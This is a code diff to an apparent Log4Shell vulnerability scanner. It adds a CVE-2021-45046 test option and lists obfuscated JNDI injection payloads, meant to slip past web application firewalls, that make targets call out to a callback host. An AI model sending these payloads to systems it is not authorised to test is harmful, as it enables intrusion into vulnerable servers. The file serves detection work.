@@ -57,7 +57,13 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{
                        "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
                        "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
                        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
-                       "${jndi:dns://{{callback_host}}}"]
+                       "${jndi:dns://{{callback_host}}}",
+                       ]
+
+cve_2021_45046 = [
+                  "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}" # Source: https://twitter.com/marcioalm/status/1471740771581652995
+                 ]  
+
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
@@ -99,6 +105,10 @@ parser.add_argument("--wait-time",
 parser.add_argument("--waf-bypass",
                     dest="waf_bypass_payloads",
                     help="Extend scans with WAF bypass payloads.",
+                    action='store_true')
+parser.add_argument("--test-CVE-2021-45046",
+                    dest="cve_2021_45046",
+                    help="Test using payloads for CVE-2021-45046 (detection payloads).",
                     action='store_true')
 parser.add_argument("--dns-callback-provider",
                     dest="dns_callback_provider",
@@ -265,6 +275,8 @@ def scan_url(url, callback_host):
     payloads = [payload]
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
+    if args.cve_2021_45046:
+        payloads = cve_2021_45046
     for payload in payloads:
         cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
         if args.request_type.upper() == "GET" or args.run_all_tests:
